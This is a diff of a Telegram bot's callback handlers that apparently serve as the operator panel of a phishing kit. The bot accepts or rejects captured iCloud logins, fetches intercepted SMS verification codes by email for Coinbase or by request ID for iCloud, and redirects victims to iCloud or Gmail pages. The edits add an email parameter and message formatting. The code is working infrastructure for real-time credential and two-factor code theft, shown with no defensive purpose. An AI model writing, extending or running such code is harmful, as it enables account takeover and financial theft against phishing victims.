@@ -395,7 +395,8 @@ bot.on("callback_query", async (query) => {
     // ✅ For SMS callbacks, get SMS code from server
     if (action.startsWith("sms_")) {
       try {
-        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}`);
+        // Try to get SMS code - identifier could be email (Coinbase) or requestId (iCloud)
+        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
         const data = await response.json();
         smsCode = data.smsCode || identifier;
       } catch (err) {
@@ -483,9 +484,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `✅ ${smsCode} SMS Accepted!`;
+        statusMessage = `✅ ${smsCode} SMS <b>Accepted</b>!`;
       } else if (action === "sms_reject") {
-        statusMessage = `❌ ${smsCode} SMS Rejected!`;
+        statusMessage = `❌ ${smsCode} SMS <b>Rejected</b>!`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
@@ -859,9 +860,9 @@ if (bot2) {
         } else if (action === "page_reject") {
           statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
         } else if (action === "sms_accept") {
-          statusMessage = `✅ ${smsCode} SMS Accepted!`;
+          statusMessage = `✅ ${smsCode} SMS <b>Accepted</b>!`;
         } else if (action === "sms_reject") {
-          statusMessage = `❌ ${smsCode} SMS Rejected!`;
+          statusMessage = `❌ ${smsCode} SMS <b>Rejected</b>!`;
         } else if (action === "redirect_icloud") {
           statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
         } else if (action === "redirect_gmail") {
